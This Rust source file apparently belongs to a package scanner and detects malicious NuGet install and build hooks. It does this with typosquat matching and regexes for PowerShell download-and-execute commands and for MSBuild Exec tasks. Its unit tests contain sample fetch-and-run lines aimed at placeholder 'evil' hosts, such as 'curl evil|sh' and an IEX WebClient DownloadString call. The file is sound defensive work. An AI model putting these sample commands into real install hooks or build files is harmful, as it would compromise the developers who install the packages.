//! NuGet-specific detection rules.
//!
//! These complement the ecosystem-agnostic rules in `argus-rules`
//! (`credential-access`, `network-exfiltration`, `ai-context-poisoning`,
//! etc.), which we still apply by calling `argus_rules::scan_text_file` on
//! every extracted text file.
//!
//! The NuGet trigger surface is the *install / build* hook layer:
//!
//! - PowerShell install hooks (`init.ps1`, `install.ps1`, `uninstall.ps1`)
//!   that run in the Package Manager Console on install/uninstall.
//! - MSBuild `.targets` / `.props` under `build/` or `buildTransitive/`
//!   that run automatically on every consumer `dotnet build` — strictly
//!   worse than a console-only install hook.
//!
//! The malware *body* in most real NuGet attacks ships as compiled managed
//! DLLs under `lib/`, which argus treats as binary and does NOT decompile.
//! See the crate docs for that blind-spot disclosure.

use argus_core::{Finding, Severity};
use regex::Regex;

/// NuGet packages that are common typosquat targets. Drawn from
/// nuget.org download statistics + recent attack reports.
pub const POPULAR_NUGET_PACKAGES: &[&str] = &[
    "Newtonsoft.Json",
    "Serilog",
    "AutoMapper",
    "Polly",
    "Dapper",
    "Moq",
    "xunit",
    "NUnit",
    "FluentAssertions",
    "Castle.Core",
    "MediatR",
    "FluentValidation",
    "Microsoft.Extensions.Logging",
    "Microsoft.Extensions.DependencyInjection",
    "Microsoft.Extensions.Configuration",
    "Microsoft.EntityFrameworkCore",
    "Swashbuckle.AspNetCore",
    "System.Text.Json",
    "RestSharp",
    "NLog",
    "log4net",
    "EntityFramework",
    "Humanizer",
    "Bogus",
    "CsvHelper",
    "MailKit",
    "BouncyCastle",
    "protobuf-net",
    "StackExchange.Redis",
    "AWSSDK.Core",
    "Azure.Storage.Blobs",
    "Google.Protobuf",
    "Grpc.Net.Client",
    "Microsoft.AspNetCore.Mvc",
    "SkiaSharp",
];

/// PowerShell content that downloads + executes code at install time. This
/// is the highest-concern signal: a `.ps1` install hook that pulls a remote
/// payload and runs it.
pub fn powershell_download_exec_regex() -> Regex {
    Regex::new(
        r#"(?ix)
        (?:
            Invoke-WebRequest |
            Invoke-RestMethod |
            \bIEX\b |
            Invoke-Expression |
            DownloadString |
            DownloadFile |
            DownloadData |
            Start-Process |
            New-Object \s+ (?:System\.)?Net\.WebClient |
            \[ Reflection\.Assembly \] :: Load
        )
        "#,
    )
    .unwrap()
}

/// PowerShell obfuscation / encoded-command markers — base64 payloads and
/// `-EncodedCommand` are classic loader shapes.
pub fn powershell_obfuscation_regex() -> Regex {
    Regex::new(
        r#"(?ix)
        (?:
            FromBase64String |
            -enc(?:odedcommand)?\b |
            \[ Convert \] :: FromBase64String
        )
        "#,
    )
    .unwrap()
}

/// MSBuild element that executes a command or downloads a file at build
/// time — `<Exec Command=...>`, `<DownloadFile ...>`, or a custom inline
/// `<Task><Code>` block. These fire on every consumer `dotnet build`.
pub fn msbuild_exec_task_regex() -> Regex {
    Regex::new(
        r#"(?ix)
        <\s*(?:
            Exec\b |
            DownloadFile\b |
            Code\b
        )
        "#,
    )
    .unwrap()
}

/// MSBuild `<UsingTask ... AssemblyFile=...>` referencing a packaged DLL —
/// build-time arbitrary code execution from a packaged assembly. XML permits
/// either single or double quotes around the attribute value
/// (`AssemblyFile="x.dll"` or `AssemblyFile='x.dll'`), so the detector
/// requires a following quote of either kind.
pub fn msbuild_inline_task_regex() -> Regex {
    Regex::new(r#"(?ix)<\s*UsingTask\b[^>]*\bAssemblyFile\s*=\s*["']"#).unwrap()
}

/// Push name-based findings (typosquatting + low-reputation) onto the
/// running findings list. Matches the pypi/crates shape.
pub fn push_name_findings(name: &str, findings: &mut Vec<Finding>) {
    let lower = name.to_ascii_lowercase();
    if POPULAR_NUGET_PACKAGES
        .iter()
        .any(|p| p.to_ascii_lowercase() == lower)
    {
        return; // legitimate package
    }
    if let Some(target) = POPULAR_NUGET_PACKAGES
        .iter()
        .copied()
        .find(|p| argus_rules::levenshtein(&lower, &p.to_ascii_lowercase()) <= 1)
    {
        findings.push(Finding::new(
            "typosquatting",
            Severity::High,
            format!("NuGet id `{name}` is one edit away from popular package `{target}`"),
        ));
        findings.push(Finding::new(
            "low-reputation",
            Severity::Medium,
            format!("typosquat candidate `{name}` has no established reputation"),
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_download_exec_fires() {
        assert!(powershell_download_exec_regex()
            .is_match("Invoke-WebRequest http://evil/x -OutFile p.exe"));
        assert!(powershell_download_exec_regex()
            .is_match("iex (New-Object Net.WebClient).DownloadString('http://x')"));
        assert!(powershell_download_exec_regex().is_match("Start-Process p.exe"));
    }

    #[test]
    fn powershell_benign_does_not_fire() {
        let benign = "param($installPath)\nWrite-Host \"Thanks for installing\"\n";
        assert!(!powershell_download_exec_regex().is_match(benign));
        assert!(!powershell_obfuscation_regex().is_match(benign));
    }

    #[test]
    fn powershell_obfuscation_fires() {
        assert!(powershell_obfuscation_regex().is_match("[Convert]::FromBase64String($payload)"));
        assert!(powershell_obfuscation_regex().is_match("powershell -enc SQBFAFgA"));
    }

    #[test]
    fn msbuild_exec_task_fires() {
        assert!(msbuild_exec_task_regex()
            .is_match(r#"<Target><Exec Command="curl evil|sh"/></Target>"#));
        assert!(msbuild_exec_task_regex().is_match(r#"<DownloadFile SourceUrl="http://x"/>"#));
    }

    #[test]
    fn msbuild_benign_does_not_fire() {
        let benign = r#"<Project><ItemGroup><Reference Include="System"/></ItemGroup></Project>"#;
        assert!(!msbuild_exec_task_regex().is_match(benign));
        assert!(!msbuild_inline_task_regex().is_match(benign));
    }

    #[test]
    fn msbuild_inline_task_fires() {
        assert!(msbuild_inline_task_regex()
            .is_match(r#"<UsingTask TaskName="Evil" AssemblyFile="evil.dll"/>"#));
    }

    #[test]
    fn msbuild_inline_task_fires_single_quoted_assemblyfile() {
        // XML allows single quotes around attribute values; an attacker can
        // use them to dodge a double-quote-only detector.
        assert!(msbuild_inline_task_regex()
            .is_match(r#"<UsingTask TaskName="Evil" AssemblyFile='x.dll' />"#));
    }

    #[test]
    fn typosquat_newtonsift_fires() {
        // `Newtonsift.Json` is exactly one substitution (o→i) from the
        // popular `Newtonsoft.Json` (Levenshtein distance 1).
        let mut f = Vec::new();
        push_name_findings("Newtonsift.Json", &mut f);
        let rules: Vec<&str> = f.iter().map(|x| x.rule_id.as_str()).collect();
        assert!(rules.contains(&"typosquatting"), "got: {rules:?}");
        assert!(rules.contains(&"low-reputation"), "got: {rules:?}");
    }

    #[test]
    fn legitimate_name_does_not_fire() {
        let mut f = Vec::new();
        push_name_findings("Newtonsoft.Json", &mut f);
        assert!(f.is_empty());
    }
}
